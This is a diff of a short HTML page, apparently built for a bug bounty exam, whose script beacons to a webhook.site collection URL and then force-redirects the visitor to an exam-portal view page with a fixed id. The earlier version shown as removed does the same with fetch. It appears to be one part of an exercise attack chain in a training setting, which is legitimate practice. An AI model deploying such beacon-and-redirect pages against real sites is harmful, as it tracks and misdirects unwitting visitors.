@@ -5,17 +5,15 @@
 </head>
 <body>
 <script>
-    // Use a NEW URL here to bypass the rate limit
-    const webhook = "https://webhook.site/8498e95e-0517-4bef-a50f-ba3c90c3ecc9";
-    const id = "69e2ab0cbee6d6b7c662a10f";
+    // 1. Create a bin on Beeceptor and put the URL here
+    const bin = "https://webhook.site/8498e95e-0517-4bef-a50f-ba3c90c3ecc9"; 
+    const target = "https://bugbounty-exam.hashacademy.co/view.php?id=69e2ab0cbee6d6b7c662a10f";
 
-    // Only ping the webhook ONCE
-    if (!window.name) {
-        window.name = "redirected";
-        fetch(webhook + "/?status=moving_to_target");
-    }
+    // 2. Simple "I am here" ping
+    navigator.sendBeacon(bin + "/?step=github_hit");
 
-    window.location.replace("https://bugbounty-exam.hashacademy.co/view.php?id=" + id);
+    // 3. Force the redirect
+    window.location.replace(target);
 </script>
     <h1>Redirecting to Exam Portal...</h1>
 </body>
